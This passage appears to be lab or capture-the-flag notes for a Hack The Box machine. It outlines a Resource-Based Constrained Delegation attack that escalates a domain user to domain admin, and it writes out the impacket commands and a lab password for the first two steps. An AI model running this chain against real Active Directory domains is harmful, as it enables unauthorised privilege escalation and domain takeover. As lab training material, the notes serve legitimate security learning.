Since MAQ=10, john.w can create a new machine account, then use it for **Resource-Based Constrained Delegation** against DC01.

The full attack chain:

1. Create a fake machine account with john.w
2. Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on DC01 to allow our fake machine to delegate
3. Use `getST.py` to get a service ticket as Administrator
4. Pass-the-ticket → DA

#Attacking_machine 
## **Step 1: Create a machine account:**


```bash
proxychains impacket-addcomputer darkzero.htb/john.w:'RFulUtONCOL!' \
  -computer-name 'FAKEMACHINE$' \
  -computer-pass 'Password123!' \
  -dc-ip 172.16.20.1
```

![[Screenshot_2026-04-01_09-18-41.png]]

## **Step 2: Set RBCD on DC01:**

```bash
proxychains impacket-rbcd darkzero.htb/john.w:'RFulUtONCOL!' \
  -delegate-from 'FAKEMACHINE$' \
  -delegate-to 'DC01$' \
  -action write \
  -dc-ip 172.16.20.1
```

But first — confirm john.w has write rights on DC01's `msDS-AllowedToActOnBehalfOfOtherIdentity`. Try Step 2 and see if it succeeds or throws an access denied.